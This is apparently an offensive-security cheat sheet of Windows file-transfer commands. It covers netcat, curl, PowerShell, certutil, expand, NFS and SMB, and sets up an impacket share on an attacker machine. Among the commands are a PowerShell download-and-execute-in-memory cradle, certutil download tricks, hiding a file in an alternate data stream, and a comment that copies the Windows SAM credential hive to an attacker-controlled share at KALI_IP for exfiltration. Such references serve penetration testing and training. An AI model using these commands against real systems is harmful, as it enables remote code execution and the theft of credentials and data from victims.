# Windows File Transfers

## Netcat

##### start listener on target
```sh
nc -nlvp [PORT] > [RECIVING_FILE]
```
##### send the file
```bash
nc [IP] [PORT] < [SENDING_FILE]
```

## Curl

```sh
curl -F "upload=@[FILE]" https://[IP]/[FILE]
```

```bash
curl -o [FILE] https://[IP]/[FILE]
```

## PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile("http://[IP]/[FILE]","C:\Path\To\[FILE]")
 ```
 ```powershell
Invoke-WebRequest 'http://[IP]/[FILE]' -OutFile "[FILE]"
```
```powershell
invoke-webrequest -uri http://[IP]/[FILE] -out C:\Path\To\[FILE]
```
```powershell
(New-Object System.Net.WebClient).UploadFile('http://[IP]/[FILE]','[FILE]')
```
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile(http://[IP]/[FILE]','[FILE]')"
```
```powershell
powershell iwr -uri http://[IP]/[FILE] -outfile [FILE]
```

##### PowerShell v3
```bash
(net.webclient).downloadstring("http://[IP]/[FILE]") > C:\Path\To\[FILE]
```
```bash
(net.webclient).downloadfile("http://[IP]/[FILE]", "C:\Path\To\[FILE]")
```

##### Download and Execute (Memory)
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('[IP]/[FILE]')"
```

## certutil

```bash
certutil -urlcache -split -f http://[IP]/[FILE] [FILE]
```
```bash
certutil -verifyctl -f -split http://[IP]/[FILE] [FILE]
```

## expand
```bash
expand http://[IP]/[FILE] [FILE]
```

##### ADS
```bash
expand \\[IP]\[FILE] C:\Path\To\[FILE]:[FILE]
```

## NFS Shares
```sh
sudo mkdir -p /mnt/[SHARE]
mount -t nfs -o vers=3 [IP]:/[FOLDER]/ /mnt/[SHARE]
```

```sh
sudo mkdir -p /mnt/[SHARE]
mount -t nfs -o vers=2 REMOTE_IP:/[FOLDER]/ /mnt/[SHARE]
```
##### Unmount
```sh
sudo umount /mnt/[SHARE]
```
##### Mount at Boot
```sh
[IP]:/[SHARE]/[FOLDER]  /mnt/[SHARE]  nfs  defaults,vers=3  0  0
```

## SMB Shares

##### Mount SMB Share
```sh
sudo mount -t cifs -o vers=1.0 //[REMOTE_IP]/[SHARE] /mnt/[SHARE]
```
##### Host SMB Share
```sh
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\[SHARE]\sam.save
sudo impacket-smbserver [SHARE] .
```
##### Upload from Target
```bash
copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
```
##### Upload with curl to Target
```sh
curl --upload-file /Path/To/[FILE] -u 'DOMAIN\[USER]' smb://[IP]/[SHARE]/
```
##### Use smbclient to Get ALL files from an SMB share
```bash
smbclient //[IP]/[SHARE]
RECURSE ON
PROMPT OFF
mget *
```

### impacket-smbserver
- From Windows to Attacker
##### Setup Share on Attack Platform
```
mkdir /mnt/[SHARE] && cd $_
```
```
sudo impacket-smbserver [SHARE] /mnt/[SHARE]
```
```
sudo impacket-smbserver [SHARE] /mnt/[SHARE] -u [USER] -p [PASS] -smb2support
```

##### Mount Share in Windows
```
net use \\[IP]\[SHARE]
```

##### Download the File
```
copy [\Path\To\File.zip] \\[IP]\[SHARE]
```